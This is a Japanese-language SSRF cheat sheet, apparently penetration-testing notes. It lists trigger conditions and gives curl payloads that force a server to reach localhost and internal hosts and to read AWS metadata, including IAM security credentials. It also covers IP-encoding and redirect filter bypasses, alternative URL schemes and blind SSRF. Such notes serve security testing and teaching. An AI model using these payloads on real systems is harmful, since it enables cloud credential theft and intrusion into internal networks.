# SSRF（Server-Side Request Forgery）

## 概要

サーバーに任意のURLへHTTPリクエストを送らせる脆弱性。外部から直接アクセスできない内部サービスへのアクセスや、クラウドメタデータの取得に使われる。

---

## 着火条件

- URLを入力するフォームがある（「画像URL」「Webhook URL」「プロキシ」など）
- パラメータに `url=`, `redirect=`, `target=`, `dest=` が含まれている
- 「外部リソースを取得する」機能がある

---

## 観点・着眼点

**サーバーが自分のかわりにリクエストを投げていないか確認：**
1. Burp Suite や `http://[自分のIP]` で受信リクエストを監視
2. `url=http://127.0.0.1/` を試して内部アクセスができるか確認
3. `url=http://169.254.169.254/` でクラウドメタデータエンドポイントを試す

---

## 手順

**基本的な内部アクセス試行：**
```bash
# localhostの内部サービスにアクセス
curl "http://[TARGET]/fetch?url=http://127.0.0.1:8080"
curl "http://[TARGET]/fetch?url=http://localhost/admin"

# 内部ネットワークのスキャン
curl "http://[TARGET]/fetch?url=http://192.168.1.1"
```

**クラウドメタデータの取得（AWS）：**
```bash
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**フィルター回避テクニック：**
```bash
# IPの別表記
http://0177.0.0.1/      # 127.0.0.1の8進数表記
http://2130706433/       # 127.0.0.1の整数表記
http://[::1]/            # IPv6のlocalhost

# リダイレクトを使ったバイパス
# 自分のサーバーに http://127.0.0.1 へのリダイレクトを設定してそのURLを入力
```

---

## 注意点・落とし穴

- サーバーがDNSを使ってホスト名を解決する場合、DNSリバインディング攻撃が有効なことがある
- プロトコルも変えてみる（`file://`, `gopher://`, `dict://`）
- レスポンスが返ってこない「Blind SSRF」の場合でも、タイミング差でアクセス可否を判断できる

---

## 関連技術
- 内部サービスへのアクセスが確認できた → 対象サービスの脆弱性を調査
